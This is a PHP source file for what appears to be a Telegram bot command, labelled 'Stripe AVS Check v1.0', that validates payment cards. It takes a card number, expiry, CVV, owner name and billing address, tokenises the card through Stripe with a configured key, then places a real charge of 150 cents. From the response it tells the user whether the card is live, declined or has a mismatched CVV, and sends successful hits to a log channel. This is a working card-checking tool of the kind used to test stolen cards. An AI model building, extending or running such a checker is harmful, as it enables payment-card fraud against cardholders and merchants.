<?php
include ('config.php');
$message = substr($message, 5); // Di chuyển việc cắt chuỗi lên sau khi kiểm tra lệnh
$cc = multiexplode(array("|"), $message)[0];
$mm = multiexplode(array("|"), $message)[1];
$yy = multiexplode(array( "|"), $message)[2];
$cvv = multiexplode(array("|"), $message)[3];
$street = multiexplode(array( "|"), $message)[4];
$city = multiexplode(array("|"), $message)[5];
$state = multiexplode(array( "|"), $message)[6];
$zip = multiexplode(array("|"), $message)[7];
$lastN = multiexplode(array("|"), $message)[8];
$firstN = multiexplode(array("|"), $message)[9];
$ct = multiexplode(array("|"), $message)[10];
$fullname = $firstN.' '.$lastN;
$check = ''.$cc.$mm.$yy.$cvv.$street.$city.$state.$zip.$lastN.$firstN.$ct.'';
//validate 
if(!isset($check)){
        sendMessage($chatId, "⚠️ <b>Invalid command</b> \n\n<b>Command:</b> /avs <code>cc|mm|yy|cvv|street|city|state|zip|lastN|firstN|ct</code> \n<b>Example:</b> /avs 4242424242424242|12|2022|123|street|city|state|zip|lastN|firstN|country", $message_id);
        return; 
} else {
$medata = ''.$cc.'|'.$mm.'|'.$yy.'|'.$cvv.'|'.$street.'|'.$city.'|'.$state.'|'.$zip.'|'.$lastN.'|'.$firstN.'|'.$ct.'';
$medata ="<code>$cc|$mm|$yy|$cvv</code>\nCard Owner: $fullname\nCard Address: $street \nCity: $city\nState: $state \nCard Zipcode: $zip \nCard country: $ct";
sendMessage($chatId, "Hold on before starting to check please check the information again. \n Card number: $cc|$mm|$yy|$cvv \n Card Owner: $fullname \n Card Address: $street \n city:$city \n State: $state \n Card Zipcode: $zip \nCard country: $ct \n \n <b>Please make sure all information is correct because it may affect the result.  </b>\n <code>Checking AVS charge 1$ will started in 5s</code>", $message_id);
sleep(10);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
};
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $pk. ':' . '');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'&card[cvc]='.$cvv.'&card[name]='.$fullname.'&card[address_line1]='.$street.'&card[address_city]='.$city.'&card[address_state]='.$state.'&card[address_zip]='.$zip.'&card[address_country]='.$ct.'');
$result1 = curl_exec($ch);
$tok1 = Getstr($result1,'"id": "','"');
$msg1 = Getstr($result1,'"message": "','"');
if(strpos($result1, "card_error")){
    sendMessage($chatId, " \n<b>Card: <code>$medata</code></b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» $msg1 </b>\n<b>Respone 2 -» $msg1a </b>\n<b>Gateway -» Stripe AVS Check v1.0 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
    return;
  }
  if (strpos($result1, "card_declined")){
    sendMessage($chatId, " \n<b>Card: $medata</b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» $msg1 </b>\n<b>Respone 2 -» $msg1a </b>\n<b>Gateway -» Stripe AVS Check v1.0 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
    return;
  }
  if (strpos($result1, "rate_limit")){
    sendMessage($chatId, "\n<b>Card:$medata</b>\n<b>Status -» TRY AGAIN LATER ⚠️</b>\n<b>Response -» SK is rate limit </b>\n<b>Gateway -» Stripe AVS Check v1.0 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
    return;
  }
  if (strpos($result1, "invalid_cvc")){
    sendMessage($chatId, "\n<b>Card: $medata</b>\n<b>Status -» TRY AGAIN ⚠️</b>\n<b>Response -» Please input card correctly ! </b>\n<b>Gateway -» Stripe AVS Check v1.0 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
    return;
  }
  if (strpos($result1, "sources_required_type_param")){
    sendMessage($chatId, "\n<b>Card: $medata</b>\n<b>Status -» TRY AGAIN ⚠️</b>\n<b>Response -» Please input card correctly ! </b>\n<b>Gateway -» Stripe AVS Check v1.0 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
    return;
  }
  if (strpos($result1, "testmode_charges_only")){
    sendMessage($chatId, "\n<b>Card: $medata</b>\n<b>Status -» SERVER REJECTED ❌</b>\n<b>Response -» Gate is Dead </b>\n<b>Gateway -» Stripe AVS Check v1.0 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
    return;
  }
  if ((strpos($result1, 'invalid_expiry_year'))){
    sendMessage($chatId, "\n<b>Card: $medata</b>\n<b>Status -» EXPRIED CARD ❌</b>\n<b>Response -» invalid_expiry_year </b>\n<b>Gateway -» Stripe AVS Check v1.0 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
    return;
  }
  if ((strpos($result1, 'invalid_expiry_month'))){
    sendMessage($chatId, "\n<b>Card: $medata</b>\n<b>Status -» EXPRIED CARD ❌</b>\n<b>Response -» invalid_expiry_month </b>\n<b>Gateway -» Stripe AVS Check v1.0 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
    return;
  }
  if ((strpos($result1, 'incorrect_number'))){
    sendMessage($chatId, "\n<b>Card:$medata</b>\n<b>Status -» INVALID CARD ❌</b>\n<b>Response -» Incorrect number </b>\n<b>Gateway -» Stripe AVS Check v1.0 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
    return;
  }
     $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=150&currency=usd&source='.$tok1.'');
    $result3 = curl_exec($ch);
    $jsonData = json_decode($result3);
    $msg3 = Getstr($result3,'"decline_code": "','"');
    $receiptUrl = $jsonData->receipt_url;
    $addressLine1Check = $jsonData->payment_method_details->card->checks->address_line1_check;
    $addressPostalCodeCheck = $jsonData->payment_method_details->card->checks->address_postal_code_check;
    $cvcCheck = $jsonData->payment_method_details->card->checks->cvc_check;
    $networkStatus = $jsonData->outcome->network_status;
    $riskLevel = $jsonData->outcome->risk_level;
    $riskScore = $jsonData->outcome->risk_score;
    $typecard = $jsonData->outcome->type;
    $sellerMessage = $jsonData->outcome->seller_message;
    $funding = $jsonData->payment_method_details->card->funding;
    if(strpos($result3, '"status": "succeeded"' )) {
        sendMessage($chatId, "<b>Card:$medata</b>\n<b>Status -» AVS CHECKED ✅</b>\n<b>Response -» AVS CHECKED ✅</b>\n<b>Gateway -» Stripe AVS Check v1.0 </b>\n<b>Risk score -» $riskScore </b>\n<b> Risk Level -» $riskLevel </b>\n<b> RECEPIT URL -» $receiptUrl</b>\n<b> Address Check -» $addressLine1Check</b>\n<b> Zip check -» $addressPostalCodeCheck</b>\n<b> CVC MATCH -» $cvcCheck</b>\n<b> Status -» $networkStatus</b>\n\n---------[Bin details]-----------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY: $country \n\n\n--------------------------------\n\n\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
        sendLog ($chatId, "<b>Card:$medata</b>\n<b>Status -» AVS CHECKED ✅</b>\n<b>Response -» AVS CHECKED ✅</b>\n<b>Gateway -» Stripe AVS Check v1.0 Logs </b>\n<b>Risk score -» $riskScore </b>\n<b> Risk Level -» $riskLevel </b>\n<b> RECEPIT URL -» $receiptUrl</b>\n<b> Address Check -» $addressLine1Check</b>\n<b> Zip check -» $addressPostalCodeCheck</b>\n<b> CVC MATCH -» $cvcCheck</b>\n<b> Status -» $networkStatus</b>\n\n---------[Bin details]-----------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY: $country \n\n\n--------------------------------\n\n\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
        return;
        }
    if(strpos($result3, "insufficient_funds" )) {
        sendMessage($chatId, "\n<b>Card:$medata</b>\n<b>Status -» APPROVED AVS NOT CHECKED ✅</b>\n<b>Response -» Insufficient Funds </b>\n<b>Gateway -» Stripe AVS Check v1.0 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
        return;
    }
    if(strpos($result3,"Your card's security code is incorrect.")){
        sendMessage($chatId, "\n<b>Card: $medata</b>\n<b>Status -» APPROVED ⚠️</b>\n<b>Response -» CCN Matched </b>\n<b>Gateway -» Stripe AVS Check v1.0 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
        return;
      }
      if ((strpos($result3, "fraudulent"))){
        sendMessage($chatId, "\n<b>Card: $medata</b>\n<b>Status -» REJECTED ⛔</b>\n<b>Response -» Fraudulent </b>\n<b>Gateway -» Stripe AVS Check v1.0 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
        return;
      }
      if ((strpos($result3, "authentication_required"))){
        sendMessage($chatId, "\n<b>Card: $medata</b>\n<b>Status -» APPROVED ⚠️</b>\n<b>Response -» This transaction requires authentication </b>\n<b>Gateway -» Stripe AVS Check v1.0 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
        return;
      }
      if ((strpos($result3, "expired_card"))){
        sendMessage($chatId, "\n<b>Card: $medata</b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» expired_card </b>\n<b>Gateway -» Stripe AVS Check v1.0 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
        return;
      }
      if ((strpos($result3, '"decline_code": "generic_decline"'))){
        sendMessage($chatId, "\n<b>Card: $medata</b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» Generic Declined </b>\n<b>Gateway -» Stripe AVS Check v1.0 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
        return;
        }
      if ((strpos($result3, "do_not_honor"))){
        sendMessage($chatId, "\n<b>Card: $medata</b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» Do Not Honor </b>\n<b>Gateway -» Stripe AVS Check v1.0 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
        return;
      }
      if ((strpos($result3, 'rate_limit'))){
        sendMessage($chatId, "\n<b>Card: $medata</b>\n<b>Status -» TRY AGAIN LATER ⚠️</b>\n<b>Response -» SK is rate limit </b>\n<b>Gateway -» Stripe AVS Check v1.0 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
        return;
      }
        
      if ((strpos($result3, "Your card was declined."))){
        sendMessage($chatId, "\n<b>Card: $medata</b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» Do Not Honor </b>\n<b>Gateway -» Stripe AVS Check v1.0 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
        return;
      }
      if ((strpos($result3, ' "message": "Your card number is incorrect."')) || (strpos($result3, ' "message": "Your card number is incorrect."'))){
        sendMessage($chatId, "\n<b>Card: $medata</b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» No Account </b>\n<b>Gateway -» Stripe AVS Check v1.0 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
        return;
      }
      if ((strpos($result3, ' "message": "testmode_charges_only"'))){
        sendMessage($chatId, "\n<b>Card: $medata</b>\n<b>Status -» SERVER REJECTED ❌</b>\n<b>Response -» Gate is Dead </b>\n<b>Gateway -» Stripe AVS Check v1.0 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
        return;
      }
      if ((strpos($result3, 'transaction_not_allowed'))){
        sendMessage($chatId, "\n<b>Card: $medata</b>\n<b>Status -» DECLINED ❌</b>\n<b>Response -» Your card does not support this type of purchase. </b>\n<b>Gateway -» Stripe AVS Check v1.0 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
        return;
      }
      if ((strpos($result3, 'invalid_number'))){
        sendMessage($chatId, "\n<b>Card: $medata</b>\n<b>Status -» NO ACCOUNT ❌</b>\n<b>Response -» invalid_number </b>\n<b>Gateway -» Stripe AVS Check v1.0 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
        return;
      }
      if ((strpos($result3, 'invalid_account'))){
        sendMessage($chatId, "\n<b>Card: $medata</b>\n<b>Status -» NO ACCOUNT ❌</b>\n<b>Response -» invalid_number </b>\n<b>Gateway -» Stripe AVS Check v1.0 </b>\n\n-----------[Bin details]--------------\n\nBANK NAME: $bank \nNAME : $name \nBRAND: $brand \nSCHEME: $scheme \nTYPE: $type \nCOUNTRY:$country\n\n-----------------------------\n\n<b>⋆ Checked By: @$usernamee</b>\n<b>⋆ Bot By:@stowe_245</b>", $message_id);
        return;
      }
      else {
        sendMessage($chatId, "<b>SERVER ERROR</b>\n <b>card:</b><code>$lista</code>\n<b>Response 1 -» <code>$msg1 | $msg1a | $result1 </code></b> \n\n<b>Response 1 -» <code>$msg2 | $msg2a | $result2 </code></b>\n\n<b>Response 1 -» <code>$msg3 | $msg3a | $result3 </code></b>", $message_id);
        sendMessage($chatId, "<b>This bug was captured and sent to admin</b>", $message_id);
        sendLog($chatId, "<b>BUG REPORTED /chg</b>\n <b>card:</b><code>$lista</code>\n<b>Response 1 -» <code>$msg1 | $msg1a | $result1 </code></b> \n\n<b>Response 1 -» <code>$msg2 | $msg2a | $result2 </code></b>\n\n<b>Response 1 -» <code>$msg3 | $msg3a | $result3 </code></b>", $message_id);
        }
      }
?>